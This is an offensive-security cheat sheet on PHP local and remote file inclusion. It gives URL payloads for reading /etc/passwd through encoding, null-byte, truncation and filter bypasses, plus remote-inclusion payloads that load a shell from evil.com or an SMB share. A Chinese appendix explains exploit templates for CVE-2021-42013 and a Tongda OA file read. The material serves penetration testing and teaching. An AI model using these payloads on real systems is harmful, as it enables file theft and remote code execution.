# File Inclusion

> A File Inclusion Vulnerability refers to a type of security vulnerability in web applications, particularly prevalent in applications developed in PHP, where an attacker can include a file, usually exploiting a lack of proper input/output sanitization. This vulnerability can lead to a range of malicious activities, including code execution, data theft, and website defacement.

## Summary

- [Tools](#tools)
- [Local File Inclusion](#local-file-inclusion)
    - [Null Byte](#null-byte)
    - [Double Encoding](#double-encoding)
    - [UTF-8 Encoding](#utf-8-encoding)
    - [Path Truncation](#path-truncation)
    - [Filter Bypass](#filter-bypass)
- [Remote File Inclusion](#remote-file-inclusion)
    - [Null Byte](#null-byte-1)
    - [Double Encoding](#double-encoding-1)
    - [Bypass allow_url_include](#bypass-allow_url_include)
- [Labs](#labs)
- [References](#references)

## Tools

- [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (archived on Oct 7, 2020) - kadimus is a tool to check and exploit lfi vulnerability.
- [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - Totally Automatic LFI Exploiter (+ Reverse Shell) and Scanner
- [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap is a little python tool which can find, prepare, audit, exploit and even google automatically for local and remote file inclusion bugs in webapps.
- [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic is an open source penetration testing tool that automates the process of search and retrieval of content for common log and config files through path traversal vulnerabilities.
- [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - Local File Inclusion discovery and exploitation tool

## Local File Inclusion

**File Inclusion Vulnerability** should be differentiated from **Path Traversal**. The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application, when the File Inclusion will lead to the execution of arbitrary code.

Consider a PHP script that includes a file based on user input. If proper sanitization is not in place, an attacker could manipulate the `page` parameter to include local or remote files, leading to unauthorized access or code execution.

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

In the following examples we include the `/etc/passwd` file, check the `Directory & Path Traversal` chapter for more interesting files.

```powershell
http://example.com/index.php?page=../../../etc/passwd
```

### Null Byte

:warning: In versions of PHP below 5.3.4 we can terminate with null byte (`%00`).

```powershell
http://example.com/index.php?page=../../../etc/passwd%00
```

**Example**: Joomla! Component Web TV 1.0 - CVE-2010-1470

```ps1
{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
```

### Double Encoding

```powershell
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### UTF-8 Encoding

```powershell
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

### Path Truncation

On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.

```powershell
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

### Filter Bypass

```powershell
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

## Remote File Inclusion

> Remote File Inclusion (RFI) is a type of vulnerability that occurs when an application includes a remote file, usually through user input, without properly validating or sanitizing the input.

Remote File Inclusion doesn't work anymore on a default configuration since `allow_url_include` is now disabled since PHP 5.

```ini
allow_url_include = On
```

Most of the filter bypasses from LFI section can be reused for RFI.

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt
```

### Null Byte

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

### Double Encoding

```powershell
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

### Bypass allow_url_include

When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows box using the `smb` protocol.

1. Create a share open to everyone
2. Write a PHP code inside a file : `shell.php`
3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`

## Labs

- [Root Me - Local File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)
- [Root Me - Local File Inclusion - Double encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)
- [Root Me - Remote File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)
- [Root Me - PHP - Filters](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)

## References

- [CVV #1: Local File Inclusion - SI9INT - Jun 20, 2018](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
- [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction - Mannu Linux - 2019-05-12](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
- [Is PHP vulnerable and under what conditions? - April 13, 2015 - Andreas Venieris](http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
- [LFI Cheat Sheet - @Arr0way - 24 Apr 2016](https://highon.coffee/blog/lfi-cheat-sheet/)
- [Testing for Local File Inclusion - OWASP - 25 June 2017](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
- [Turning LFI into RFI - Grayson Christopher - 2017-08-14](https://web.archive.org/web/20170815004721/https://l.avala.mp/?p=241)

## 八、典型漏洞 YAML 文件分析

本目录及上级目录收录了多个与文件包含和路径遍历相关的漏洞利用模板，以下对部分典型 YAML 文件进行详细解读。

### 1. CVE-2021-42013.yaml (Apache 路径遍历与 RCE)
- **漏洞类型**：路径遍历 & 远程代码执行
- **漏洞原理**：
  由于 Apache HTTP Server 2.4.49/2.4.50 版本中对路径规范化的修复不完整，攻击者可以通过构造特殊的 URL（如使用 `%%32%65` 进行编码绕过）来访问预期文档根目录之外的文件。如果 `mod_cgi` 等模块被启用，此路径遍历漏洞可能升级为远程代码执行。
- **探测原理**：
  该 YAML 模板首先尝试通过编码后的路径遍历 payload (`/icons/%%32%65.../etc/passwd`) 读取 `/etc/passwd` 文件，如果成功则确认 LFI。接着，它会尝试向 `/cgi-bin/`下的 `sh` 发送 POST 请求执行命令（`echo`），如果命令成功执行并返回预期结果，则确认 RCE。
- **修复建议**：升级 Apache HTTP Server至 2.4.51 或更高版本。

### 2. tongda-path-traversal.yaml (通达 OA 任意文件读取)
- **漏洞类型**：路径遍历
- **漏洞原理**：
  通达 OA 的 `gateway.php` 接口在处理 `json` 参数时，未对其中的 `url` 键值进行充分过滤。攻击者可以通过 `../` 来遍历服务器目录，读取任意文件，例如 `my.ini` 数据库配置文件。
- **探测原理**：
  该模板向 `/ispirit/interface/gateway.php` 发送一个 POST 请求，其 `json` 参数被构造成 `{"url":"/general/../../mysql5/my.ini"}`。服务器处理后，会返回 `my.ini` 文件的内容。模板通过匹配响应中 `[mysql]` 和 `password=` 等关键字来确认漏洞。
- **修复建议**：升级通达 OA 版本，并对所有涉及文件操作的输入参数进行严格的路径和字符过滤。

---

#### 总结
本地文件包含（LFI）和路径遍历漏洞的根源在于服务端未能有效过滤用户提交的路径信息。攻击者可以借此读取敏感配置文件、源代码，甚至结合其他漏洞（如文件上传）或特定环境配置（如 `mod_cgi`）实现远程代码执行。防御核心在于：
- **输入验证**：对用户输入进行严格过滤，禁止 `../` 等路径跳转字符。
- **路径规范化**：在访问文件系统前，对路径进行解析和规范化，确保其始终在安全的根目录内。
- **权限控制**：Web 服务器应以最小权限运行，并严格限制对敏感文件和目录的访问。
